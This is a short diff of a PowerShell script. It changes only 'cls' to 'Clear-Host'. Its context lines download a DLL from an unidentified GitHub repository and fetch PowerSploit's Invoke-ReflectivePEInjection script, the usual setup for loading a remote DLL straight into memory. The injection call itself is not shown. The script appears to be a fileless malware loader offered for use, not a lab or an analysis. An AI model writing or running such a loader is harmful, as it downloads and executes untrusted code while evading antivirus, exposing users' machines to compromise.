@@ -1,4 +1,4 @@
-cls
+Clear-Host
 $dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"
 $dllBytes = (iwr -UseBasicParsing $dllUrl).Content
 $ps1 = (iwr -UseBasicParsing "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
